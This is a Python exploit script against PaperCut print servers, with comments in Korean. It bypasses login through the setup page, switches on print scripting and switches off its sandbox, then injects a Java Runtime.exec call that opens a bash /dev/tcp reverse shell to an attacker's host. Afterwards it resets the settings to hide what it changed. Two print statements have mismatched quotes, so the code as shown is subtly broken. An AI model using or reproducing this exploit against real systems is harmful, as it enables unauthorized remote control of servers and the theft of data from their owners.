#!/usr/bin/python3
import argparse
import requests
import subprocess
import urllib.parse
import time

def get_session_id(base_url):
    s = requests.Session()
    r = s.get(f'{base_url}/app?service=page/SetupCompleted', verify=False)

    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'direct/1/SetupCompleted/$Form',
        'sp': 'S0',
        'Form0': '$Hidden,analyticsEnabled,$Submit',
        '$Hidden': 'true',
        '$Submit': 'Login'
    }
    r = s.post(f'{base_url}/app', data=data, headers=headers, verify=False)
    if r.status_code == 200 and b'papercut' in r.content and 'JSESSIONID' in r.headers.get('Set-Cookie', ''):
        print(f'[*] Papercut instance is vulnerable! Obtained valid JSESSIONID')
        return s
    else:
        print(f'[-] Failed to get valid response, likely not vulnerable')
        return None

def set_setting(base_url, session, setting, enabled):
    print(f'[*] Updating {setting} to {enabled}')
    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'direct/1/ConfigEditor/quickFindForm',
        'sp': 'S0',
        'Form0': '$TextField,doQuickFind,clear',
        '$TextField': setting,
        'doQuickFind': 'Go'
    }
    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)

    data = {
        'service': 'direct/1/ConfigEditor/$Form',
        'sp': 'S1',
        'Form1': '$TextField$0,$Submit,$Submit$0',
        '$TextField$0': enabled,
        '$TextField$0': enabled,
        '$Submit': 'Update'
    }
    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)

def execute_reverse_shell(base_url, session, lhost, lport):
    print(f'[*] Preparing to execute reverse shell to {lhost}:{lport}')

    # 더 명시적인 bash 리버스 쉘 페이로드 및 인코딩 처리
    reverse_shell_payload = f"bash -c $'bash -i >& /dev/tcp/{lhost}/{lport} <&1'"
    encoded_payload = urllib.parse.quote(reverse_shell_payload)

    # Java exec() 호출 시 페이로드 전달 방식 수정
    payload = f"java.lang.Runtime.getRuntime().exec(new String[]{{\"/bin/bash\", \"-c\", \"{reverse_shell_payload}\"}});"

    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'page/PrinterList'
    }
    r = session.get(f'{base_url}/app?service=page/PrinterList', data=data, headers=headers, verify=False)

    data = {
        'service': 'direct/1/PrinterList/selectPrinter',
        'sp': 'l1001'
    }
    r = session.get(f'{base_url}/app?service=direct/1/PrinterList/selectPrinter&sp=l1001', data=data, headers=headers, verify=False)

    data = {
        'service': 'direct/1/PrinterDetails/printerOptionsTab.tab',
        'sp': '4'
    }
    r = session.get(f'{base_url}/app', data=data, headers=headers, verify=False)

    data = {
        'service': 'direct/1/PrinterDetails/$PrinterDetailsScript.$Form',
        'sp': 'S0',
        'Form0': 'printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1',
        'printerId': 'l1001',
        'enablePrintScript': 'on',
        'scriptBody': "function printJobHook(inputs, actions) {}\r\n" \
                            f"{payload}",
        '$Submit$1': 'Apply',
    }
    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
    if r.status_code == 200 and 'Saved successfully' in r.text:
        print(f'[+] Reverse shell command injected. Please check your listener at {lhost}:{lport} in a few seconds.')
        print(f'[+] Payload: {payload}")
    else:
        print('[-] Might not have a printer configured. Exploit manually by adding one.')
        print(f'[-] Failed Payload: {payload}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='The URL of the Papercut target application', required=True)
    parser.add_argument('--lhost', help='Your Kali Linux IP address for the reverse shell', required=True)
    parser.add_argument('--lport', type=int, help='Your listening port for the reverse shell', required=True)
    args = parser.parse_args()

    sess = get_session_id(args.url)
    if sess:
        set_setting(args.url, sess, setting='print-and-device.script.enabled', enabled='Y')
        set_setting(args.url, sess, setting='print.script.sandboxed', enabled='N')
        execute_reverse_shell(args.url, sess, args.lhost, args.lport)
        set_setting(args.url, sess, setting='print-and-device.script.enabled', enabled='N')
        set_setting(args.url, sess, setting='print.script.sandboxed', enabled='Y')
